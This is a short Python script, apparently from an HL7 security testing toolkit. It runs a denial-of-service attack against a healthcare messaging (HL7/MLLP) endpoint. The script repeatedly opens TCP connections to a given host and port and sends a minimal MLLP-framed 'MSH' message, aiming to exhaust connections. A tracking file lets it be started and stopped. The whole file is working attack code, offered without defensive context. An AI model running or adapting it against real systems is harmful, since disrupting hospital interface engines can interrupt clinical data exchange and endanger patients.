import socket

def DOS(host,port):
    message="MSH"

    for i in range(1, 99999):
        dosTrackingFile = open('hl7/networkFiles/dosTrackingFile.txt', 'r')
        state = dosTrackingFile.read()
        dosTrackingFile.close()
        print("state " + state)

        print("DOS count " + str(i))
        if int(state) == 1:

            try:
                conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                conn.settimeout(1)
                conn.connect((host, int(port)))

                # start and end block - used to define start and End of message in MLLP
                start_block = b'\x0b'
                end_block = b'\x1c'
                carriage_return = b'\x0d'

                # create message here
                msg = start_block.decode() + message + end_block.decode() + carriage_return.decode()
                conn.send(msg.encode())

                try:
                    ack = conn.recv(4096)
                    if ack:
                        writeAck = ack.decode()
                        print("Alive! "+writeAck)
                    else:
                        print("Exhausted all connections")
                except socket.timeout as e:
                    return e

            except socket.error as e:
                print("Exhausted all connections"+ str(e))
        elif int(state) == 0:
            break

def startDOS(host,port,start):

    if int(start) == 1:
        print("Starting DOS")
        dosTrackingFile = open('hl7/networkFiles/dosTrackingFile.txt', 'w')
        dosTrackingFile.write("1")
        dosTrackingFile.close()
        DOS(host, port)

    elif int(start) == 0:
        print("Stopping DOS")
        dosTrackingFile = open('hl7/networkFiles/dosTrackingFile.txt', 'w')
        dosTrackingFile.write("0")
        dosTrackingFile.close()
        return